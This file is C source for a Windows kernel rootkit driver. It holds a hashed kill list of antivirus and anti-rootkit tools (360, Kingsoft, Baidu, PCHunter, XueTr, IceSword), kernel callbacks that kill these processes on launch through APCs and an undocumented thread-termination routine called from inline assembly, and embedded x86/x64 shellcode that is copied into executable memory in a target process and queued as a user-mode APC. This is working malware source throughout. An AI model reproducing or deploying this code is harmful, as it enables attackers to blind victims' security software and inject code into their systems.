#include "rk.h"
#include "InitializeInjectRelevantInfo.h"
#include "ToolFnc.h"
#include "Utils.h"
#include "ApcKillProcess.h"

BOOLEAN g_bInjectProcessFlag = 0;
BOOLEAN g_bExplorerLoader = 0;
HANDLE g_InjectProcessId = 0;
PVOID g_pInjectBuffer = NULL;
HANDLE g_hExplorerProcessId = NULL;


PKAPC pApc = NULL;
#define KILL_PROCESS_NUM	19
ULONG g_KillListProcess[KILL_PROCESS_NUM] =
{
	0x14a503ca,		//360tray.exe
	0x13e003a9,		//360safe.exe
	0x0cb602e1,		//360sd.exe
	0x0cec02ec,		//360rp.exe
	0x403706fa,		//zhudongfangyu.exe
	0x16c7040c,		//qqpccrtp.exe
	0x1f9d04c7,		//ksafesvc.exe
	0x12c903cb,		//ksafetray.exe
	0x30c6060d,		//baidusdtray.exe
	0x306c0605,		//baiduantray.exe
	0x29d2058c,		//badduansvc.exe
	0x2455052a,		//baiduhips.exe
	0x378d0677,		//baiduprotect.exe
	0x12da03a9,		//xuetr.exe
	0x292a053f,		//pchunter32.exe
	0x29460544,		//pchunter64.exe
	0x269d055c,		//powertool.exe
	0x1fd304d1,		//icesword.exe
	0x314905a2		//uddmey55LO5o.exe
};

//PVOID g_pInjectShellCode = NULL;
#ifndef _WIN64
ULONG g_ulInjectShellCodeLength = 224;
unsigned char g_pInjectShellCode[224] = {
	0x60, 0xFC, 0x89, 0xE5, 0xE8, 0x90, 0x00, 0x00, 0x00, 0x8B, 0x5E, 0x3C, 0x01, 0xF3, 0xE8, 0x17, 
	0x00, 0x00, 0x00, 0x55, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5D, 0x83, 0xED, 0x19, 0x6A, 0x00, 0xFF, 
	0x95, 0xD6, 0x00, 0x00, 0x00, 0xE9, 0xB0, 0x00, 0x00, 0x00, 0x60, 0x8B, 0x53, 0x78, 0x01, 0xF2, 
	0x31, 0xDB, 0x8B, 0x4A, 0x20, 0x01, 0xF1, 0x8B, 0x42, 0x1C, 0x01, 0xF0, 0x8B, 0x7A, 0x18, 0x8B, 
	0x6A, 0x24, 0x01, 0xF5, 0x8B, 0x11, 0x01, 0xF2, 0x50, 0x53, 0x66, 0x8B, 0x5C, 0x5D, 0x00, 0x81, 
	0xE3, 0xFF, 0xFF, 0x00, 0x00, 0x8B, 0x04, 0x98, 0x01, 0xF0, 0xE8, 0x0B, 0x00, 0x00, 0x00, 0x5B, 
	0x58, 0x83, 0xC1, 0x04, 0x43, 0x4F, 0x75, 0xDC, 0x61, 0xC3, 0x60, 0x89, 0xC3, 0xE8, 0x3C, 0x00, 
	0x00, 0x00, 0x89, 0xC2, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5D, 0x83, 0xED, 0x79, 0x8D, 0xB5, 0xCE, 
	0x00, 0x00, 0x00, 0x8D, 0xBD, 0xD2, 0x00, 0x00, 0x00, 0x83, 0xC7, 0x04, 0xAD, 0x85, 0xC0, 0x74, 
	0x06, 0x39, 0xD0, 0x75, 0xF4, 0x89, 0x1F, 0x61, 0xC3, 0xBA, 0x30, 0x00, 0x00, 0x00, 0x64, 0x8B, 
	0x32, 0x8B, 0x76, 0x0C, 0x8B, 0x76, 0x0C, 0xAD, 0x8B, 0x30, 0x8B, 0x76, 0x18, 0xC3, 0x51, 0x53, 
	0x52, 0x31, 0xC9, 0x31, 0xC0, 0x31, 0xDB, 0x40, 0x8A, 0x0A, 0x84, 0xC9, 0x74, 0x07, 0x01, 0xC8, 
	0x01, 0xC3, 0x42, 0xEB, 0xF3, 0xC1, 0xE3, 0x10, 0x09, 0xD8, 0x5A, 0x5B, 0x59, 0xC3, 0x7A, 0x04, 
	0x1E, 0x1A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x89, 0xEC, 0x61, 0xC2, 0x0C, 0x00
};
#else
ULONG g_ulInjectShellCodeLength = 308;
unsigned char g_pInjectShellCode[308] = {
	0x53, 0x55, 0x57, 0x56, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x89, 0xE5, 0x48, 
	0x83, 0xE4, 0xF0, 0xE8, 0x21, 0x00, 0x00, 0x00, 0x48, 0x89, 0xF0, 0xE8, 0x36, 0x00, 0x00, 0x00, 
	0xE8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x5F, 0x49, 0x83, 0xEF, 0x25, 0x31, 0xC9, 0x41, 0xFF, 0x97, 
	0x1C, 0x01, 0x00, 0x00, 0xE9, 0xEB, 0x00, 0x00, 0x00, 0x90, 0xB9, 0x60, 0x00, 0x00, 0x00, 0x65, 
	0x48, 0x8B, 0x31, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x30, 0x48, 0x8B, 0x36, 0x48, 0x8B, 
	0x36, 0x48, 0x8B, 0x76, 0x10, 0xC3, 0x55, 0x48, 0x89, 0xC6, 0x8B, 0x4E, 0x3C, 0x48, 0x01, 0xF1, 
	0x8B, 0x91, 0x88, 0x00, 0x00, 0x00, 0x48, 0x01, 0xF2, 0x51, 0x8B, 0x4A, 0x20, 0x48, 0x01, 0xF1, 
	0x44, 0x8B, 0x72, 0x1C, 0x49, 0x01, 0xF6, 0x8B, 0x7A, 0x18, 0x8B, 0x6A, 0x24, 0x48, 0x01, 0xF5, 
	0x4D, 0x31, 0xC0, 0x8B, 0x11, 0x48, 0x01, 0xF2, 0x66, 0x42, 0x8B, 0x5C, 0x45, 0x00, 0x81, 0xE3, 
	0xFF, 0xFF, 0x00, 0x00, 0x41, 0x8B, 0x04, 0x9E, 0x48, 0x01, 0xF0, 0xE8, 0x0E, 0x00, 0x00, 0x00, 
	0x48, 0x83, 0xC1, 0x04, 0x49, 0xFF, 0xC0, 0xFF, 0xCF, 0x75, 0xD8, 0x5A, 0x5D, 0xC3, 0xE8, 0x3A, 
	0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x5F, 0x49, 0x81, 0xEF, 0xB8, 0x00, 0x00, 
	0x00, 0x4D, 0x8D, 0x9F, 0x14, 0x01, 0x00, 0x00, 0x4D, 0x8D, 0xAF, 0x1C, 0x01, 0x00, 0x00, 0x49, 
	0xC7, 0xC4, 0xFC, 0xFF, 0xFF, 0xFF, 0x49, 0x83, 0xC4, 0x04, 0x43, 0x83, 0x3C, 0x23, 0x00, 0x74, 
	0x0B, 0x47, 0x39, 0x0C, 0x23, 0x75, 0xEF, 0x4B, 0x89, 0x44, 0x65, 0x00, 0xC3, 0x45, 0x31, 0xC9, 
	0x45, 0x31, 0xD2, 0x41, 0xFF, 0xC1, 0x45, 0x31, 0xDB, 0x44, 0x8A, 0x1A, 0x45, 0x84, 0xDB, 0x74, 
	0x0B, 0x45, 0x01, 0xD9, 0x45, 0x01, 0xCA, 0x48, 0xFF, 0xC2, 0xEB, 0xED, 0x41, 0xC1, 0xE2, 0x10, 
	0x45, 0x09, 0xD1, 0xC3, 0x97, 0x04, 0x81, 0x1D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xEC, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5E, 
	0x5F, 0x5D, 0x5B, 0xC3
};
#endif

VOID InjectMonitorThread(PVOID StartContext)
{
	PVOID pEProcess,pCurProc;
	KAPC_STATE ApcState;
	BOOLEAN bIsAttached;
	NTSTATUS Status;
	SIZE_T AllocateLength;

	Status = STATUS_SUCCESS;
	bIsAttached = FALSE;
	AllocateLength = g_ulInjectShellCodeLength;

	pEProcess = NULL;
	if (PsLookupProcessByProcessId((HANDLE)StartContext,(PEPROCESS *)&pEProcess) >= 0)
	{
		if (pEProcess)
		{
			pCurProc = IoGetCurrentProcess();
			if (pEProcess != pCurProc)
			{
				KeStackAttachProcess(pEProcess,&ApcState);
				bIsAttached = TRUE;
			}
#ifndef _WIN64
			Status = ZwAllocateVirtualMemory((HANDLE)0xFFFFFFFF, \
				&g_pInjectBuffer, \
				0, \
				&AllocateLength, \
				MEM_RESERVE | MEM_COMMIT, \
				0x40);
#else
			Status = ZwAllocateVirtualMemory((HANDLE)0xFFFFFFFFFFFFFFFF, \
				&g_pInjectBuffer, \
				0, \
				&AllocateLength, \
				/*0x3000, \*/
				MEM_COMMIT,
				0x40);

#endif
			if (NT_SUCCESS(Status))
			{
				memcpy((PCHAR)g_pInjectBuffer,(PCHAR)g_pInjectShellCode,g_ulInjectShellCodeLength);
			}
			if (bIsAttached)
			{
				KeUnstackDetachProcess(&ApcState);
			}
			PsTerminateSystemThread(0xFFFFFFFF);
		}
	}
}
void KernelRoutine(PKAPC *Apc, \
				   PVOID *NormalRoutine, \
				   PVOID *NormalContext, \
				   PVOID *SystemArgument1, \
				   PVOID *SystemArgument2)
{
	if (pApc)
	{
		ExFreePoolWithTag(pApc,'vdkF');
		pApc = NULL;
	}
	//PsRemoveLoadImageNotifyRoutine(InjectNotifyRoutine);
	return;
}
BOOLEAN InsertApc(PVOID pShellCode,PKAPC pApc)
{
	PVOID pKThread;
	BOOLEAN bRet;

	bRet = FALSE;

	pKThread = KeGetCurrentThread();
	KeInitializeApc((PRKAPC)pApc, \
		(PRKTHREAD)pKThread, \
		(KAPC_ENVIRONMENT)NULL, \
		(PKKERNEL_ROUTINE)KernelRoutine, \
		NULL, \
		pShellCode, \
		UserMode, \
		NULL);
	bRet = KeInsertQueueApc(pApc,(PVOID)NULL,(PVOID)NULL,(LONG)0);
	//bRet = KeAlertThread(pKThread,UserMode);
	return bRet;
}
BOOLEAN InjectProcess(HANDLE hProcessId)
{
	HANDLE hThread;
	NTSTATUS Status;
	PVOID pThreadObject;
	BOOLEAN bRet;

	bRet = FALSE;
	Status = STATUS_SUCCESS;
	pThreadObject = NULL;

	Status = PsCreateSystemThread(&hThread, \
		0x1FFFFF, \
		NULL, \
		0, \
		NULL, \
		InjectMonitorThread, \
		hProcessId);
	if (NT_SUCCESS(Status))
	{
		Status = ObReferenceObjectByHandle(hThread, \
			0x1FFFFF, \
			NULL, \
			0, \
			&pThreadObject, \
			NULL);
		if (NT_SUCCESS(Status))
		{
			KeWaitForSingleObject(pThreadObject, \
				Executive, \
				KernelMode, \
				FALSE, \
				0);
			ObDereferenceObject(pThreadObject);
			bRet = TRUE;
		}
		ZwClose(hThread);
	}
	return bRet;
}

VOID InjectNotifyRoutine(PUNICODE_STRING FullImageName,HANDLE ProcessId,PIMAGE_INFO ImageInfo)
{
	PUCHAR pImageName;
	NTSTATUS Status;
	PVOID pCurProc;

	Status = STATUS_SUCCESS;
	pImageName = NULL;

	if (g_bInjectProcessFlag)
	{
		//PsRemoveLoadImageNotifyRoutine(InjectNotifyRoutine);
		return;
	}
	Status = PsLookupProcessByProcessId(ProcessId,(PEPROCESS*)&pCurProc);
	if (NT_SUCCESS(Status))
	{
		pImageName = PsGetProcessImageFileName(pCurProc);
		if (pImageName)
		{
			if (strncmp(pImageName,"xuetr",strlen("xuetr")) == 0)
			{
				KillProcessWithApc(pCurProc);
				//System_Sleep(WAIT_ONE_MINUTE);
				//InjectProcess(ProcessId);
				//if (g_pInjectBuffer == NULL)
				//{
				//	return;
				//}
				//if (NULL == pApc)
				//{
				//	pApc = (PKAPC)ExAllocatePoolWithTag(NonPagedPool,sizeof(KAPC),'vdkF');
				//	if (pApc == NULL)
				//	{
				//		return;
				//	}
				//}
				//if (InsertApc(g_pInjectBuffer,pApc))
				//{
				//	g_bInjectProcessFlag = TRUE;
				//}
			}
		}
	}
	return;
}
void CreateProcessRoutine(HANDLE ParentId,HANDLE ProcessId,BOOLEAN Create)
{
	PUCHAR pImageName;
	PVOID pCurProc;
	NTSTATUS Status;
	ULONG ulHashValue;
	ULONG uli;

	pCurProc = NULL;
	pImageName = NULL;
	ulHashValue = 0;

	Status = STATUS_SUCCESS;
	pImageName = NULL;

	Status = PsLookupProcessByProcessId(ProcessId,(PEPROCESS*)&pCurProc);
	if (NT_SUCCESS(Status))
	{
		pImageName = PsGetProcessImageFileName(pCurProc);
		if (pImageName)
		{
			_strlwr_d(pImageName);
			ulHashValue = CalcHashValue(pImageName);
			if (Create)
			{
				for (uli = 0;uli < KILL_PROCESS_NUM;uli++)
				{
					if (ulHashValue == g_KillListProcess[uli])
					{
						KillProcessWithApc(pCurProc);
						break;
					}
				}
			}
			if (ulHashValue == 0x208604e2)	//explorer.exe
			{
				if (Create)
				{
					g_hExplorerProcessId = ProcessId;
					g_Rk2017RunTimeLibrary.bIsStartFilter = TRUE;
				}
				else
				{
					g_hExplorerProcessId = NULL;
					g_Rk2017RunTimeLibrary.bIsStartFilter = FALSE;
				}
			}
		}
		if (pCurProc)
		{
			ObDereferenceObject(pCurProc);
		}
	}
}
PVOID SearchHexCodeFromAddress(PVOID pAddress)
{
	PUCHAR pSearch;
	ULONG uli,ulOffset;
	PVOID pRetAddress;


	if (NULL == pAddress)
	{
		return NULL;
	}
	pSearch = (PUCHAR)pAddress;
	for (uli = 0;uli < 0x5A;uli++)
	{
		if (MmIsAddressValid((PVOID)((ULONG)pSearch + uli)) && \
			pSearch[uli] == 0xE8)
		{
			if (pSearch[uli - 1] == 0x01 && pSearch[uli - 2] == 0x6A)
			{
				if (MmIsAddressValid((ULONG*)((ULONG)pSearch + uli + 1)))
				{
					ulOffset = *(ULONG*)((ULONG)pSearch + uli + 1);
					if (MmIsAddressValid((PVOID)(((ULONG)pSearch + uli) + ulOffset + 5)))
					{
						pRetAddress = (PVOID)(((ULONG)pSearch + uli) + ulOffset + 5);
						return pRetAddress;
					}
				}
				return NULL;
			}
			else if (pSearch[uli - 1 - 3] == 0x01 && pSearch[uli - 1 - 4] == 0x6A)
			{
				if (MmIsAddressValid((ULONG*)((ULONG)pSearch + uli + 1)))
				{
					ulOffset = *(ULONG*)((ULONG)pSearch + uli + 1);
					if (MmIsAddressValid((PVOID)(((ULONG)pSearch + uli) + ulOffset + 5)))
					{
						pRetAddress = (PVOID)(((ULONG)pSearch + uli) + ulOffset + 5);
						return pRetAddress;
					}
				}
				return NULL;
			}
			else if (pSearch[uli - 1 - 4] == 0x01 && pSearch[uli - 1 - 5] == 0x6A)
			{
				if (MmIsAddressValid((ULONG*)((ULONG)pSearch + uli + 1)))
				{
					ulOffset = *(ULONG*)((ULONG)pSearch + uli + 1);
					if (MmIsAddressValid((PVOID)(((ULONG)pSearch + uli) + ulOffset + 5)))
					{
						pRetAddress = (PVOID)(((ULONG)pSearch + uli) + ulOffset + 5);
						return pRetAddress;
					}
				}
				return NULL;
			}
			else
			{
				if (pSearch[uli - 1] == 0x50)
				{
					if (MmIsAddressValid((ULONG*)((ULONG)pSearch + uli + 1)))
					{
						ulOffset = *(ULONG*)((ULONG)pSearch + uli + 1);
						if (MmIsAddressValid((PVOID)(((ULONG)pSearch + uli) + ulOffset + 5)))
						{
							pRetAddress = (PVOID)(((ULONG)pSearch + uli) + ulOffset + 5);
							return pRetAddress;
						}
					}
				}
			}
		}
	}
	return NULL;
}
#ifndef _WIN64

VOID KillProcessWithApc(PVOID pEProc)
{
	PVOID pExitEThread;
	PRKAPC pExitApc;
	PLIST_ENTRY pThreadHead,pCurThreadList;

	pExitEThread = NULL;
	pExitApc = NULL;
	pThreadHead = NULL;
	pCurThreadList = NULL;

	pThreadHead = (PVOID)((ULONG_PTR)pEProc + g_InjectRelevantOffset.ulOffsetThreadListHead);
	pCurThreadList = pThreadHead->Flink;
	while (pThreadHead != pCurThreadList)
	{
		pExitEThread = (PVOID)((ULONG_PTR)pCurThreadList - g_InjectRelevantOffset.ulOffsetThreadListEntry);
		if (pExitEThread)
		{			
			do 
			{
				pExitApc = ExAllocatePool(NonPagedPool,sizeof(KAPC));
			} while (pExitApc == NULL);
			RtlZeroMemory(pExitApc,sizeof(KAPC));
			KeInitializeApc(pExitApc,
				(PKTHREAD)pExitEThread,
				OriginalApcEnvironment,
				(PVOID)ApcKillThreadRoutine,
				NULL,
				NULL,
				KernelMode,
				NULL);
			KeInsertQueueApc(pExitApc,NULL,NULL,2);
		}
		pCurThreadList = pCurThreadList->Flink;
	}
	return;
}
VOID ApcKillThreadRoutine(PVOID pApc, \
						  PVOID *NormalRoutine, \
						  PVOID *NormalContext, \
						  PVOID *SystemArgument1, \
						  PVOID *SystemArgument2)
{
	PVOID pEThread;

	pEThread = NULL;
	DbgPrint("ApcKillThreadRoutine\n");
	if (pApc)
	{
		ExFreePool(pApc);
	}
	
	pEThread = KeGetCurrentThread();
	if (MmIsAddressValid(g_InjectRelevantOffset.PspTerminateThreadByPointer) && \
		NULL != g_InjectRelevantOffset.PspTerminateThreadByPointer)
	{
		if (g_InjectRelevantOffset.WindowsVersion.bIsWindowsXp)
		{
			PspTerminateThreadByPointerForWindowsXpx86(pEThread,STATUS_SUCCESS,TRUE);
		}
		else if (g_InjectRelevantOffset.WindowsVersion.bIsWindows7 && \
			FALSE == g_InjectRelevantOffset.WindowsVersion.bIs64Bit)
		{
			g_InjectRelevantOffset.PspTerminateThreadByPointer(pEThread,STATUS_SUCCESS,TRUE);
		}
		else if (g_InjectRelevantOffset.WindowsVersion.bIsWindows8 && \
			FALSE == g_InjectRelevantOffset.WindowsVersion.bIs64Bit)
		{
			PspTerminateThreadByPointerForWindows8x86(pEThread,STATUS_SUCCESS,TRUE);
		}
		else if (g_InjectRelevantOffset.WindowsVersion.bIsWindows81 && \
			FALSE == g_InjectRelevantOffset.WindowsVersion.bIs64Bit)
		{
			PspTerminateThreadByPointerForWindows81x86(pEThread,STATUS_SUCCESS,TRUE);
		}
		else if (g_InjectRelevantOffset.WindowsVersion.bIsWindows10 && \
			FALSE == g_InjectRelevantOffset.WindowsVersion.bIs64Bit)
		{
			PspTerminateThreadByPointerForWindows10x86(pEThread,STATUS_SUCCESS,TRUE);
		}
		else
		{

		}
	}
	return;
}
__declspec(naked) NTSTATUS PspTerminateThreadByPointerForWindows8x86(PVOID pEThread, \
																	 NTSTATUS ExitStatus, \
																	 BOOLEAN DirectTerminate)
{
	__asm
	{
		mov edi,edi
		push ebp
		mov ebp,esp
		push edi
		mov edi,pEThread
		or dword ptr [edi + 0x58],0x1000		//set system flag
		test dword ptr[edi + 0x58],0x1000
		jz __PsTerminateThreadForWin8RetValue
		push 1
		push ExitStatus
		call g_InjectRelevantOffset.PspTerminateThreadByPointer
		jmp __PsTerminateThreadForWin8Ret
__PsTerminateThreadForWin8RetValue:
		mov eax,0xC000000D
__PsTerminateThreadForWin8Ret:
		pop edi
		pop ebp
		ret 0x0C
	}
}
__declspec(naked) NTSTATUS PspTerminateThreadByPointerForWindows81x86(PVOID pEThread, \
																	 NTSTATUS ExitStatus, \
																	 BOOLEAN DirectTerminate)
{
	__asm
	{
		mov edi,edi
		push ebp
		mov ebp,esp
		mov ecx,pEThread
		or dword ptr [ecx + 0x58],0x800
		test dword ptr[ecx + 0x58],0x800
		jz __PsTerminateThreadForWin81RetValue
		mov edx,ExitStatus
		push 1
		call g_InjectRelevantOffset.PspTerminateThreadByPointer
		jmp __PsTerminateThreadForWin81Ret
__PsTerminateThreadForWin81RetValue:
		mov eax,0xC000000D
__PsTerminateThreadForWin81Ret:
		pop ebp
		ret 0x0C
	}
}
__declspec(naked) NTSTATUS PspTerminateThreadByPointerForWindows10x86(PVOID pEThread, \
																	  NTSTATUS ExitStatus, \
																	  BOOLEAN DirectTerminate)
{
	__asm
	{
		mov edi,edi
		push ebp
		mov ebp,esp
		push ecx
		mov ecx,pEThread
		or dword ptr [ecx + 0x58],0x400
		test dword ptr[ecx + 0x58],0x400
		jz __PsTerminateThreadForWin10RetValue
		mov edx,ExitStatus
		push 1
		call g_InjectRelevantOffset.PspTerminateThreadByPointer
		jmp __PsTerminateThreadForWin10Ret
__PsTerminateThreadForWin10RetValue:
		mov eax,0xC000000D
__PsTerminateThreadForWin10Ret:
		pop ecx
		pop ebp
		ret 0x0C
	}
}
__declspec(naked) NTSTATUS PspTerminateThreadByPointerForWindowsXpx86(PVOID pEThread, \
																	  NTSTATUS ExitStatus, \
																	  BOOLEAN DirectTerminate)
{
	__asm
	{
		mov edi,edi
		push ebp
		mov ebp,esp
		mov eax,pEThread
		or dword ptr [eax + 0x248],0x10
		test dword ptr[eax + 0x248],0x10
		jz __PsTerminateThreadForWinXpRetValue
		push ExitStatus
		push eax
		call g_InjectRelevantOffset.PspTerminateThreadByPointer
		jmp __PsTerminateThreadForWinXpRet
__PsTerminateThreadForWinXpRetValue:
		mov eax,0xC000000D
__PsTerminateThreadForWinXpRet:
		pop ebp
		ret 0x0C
	}
}



#endif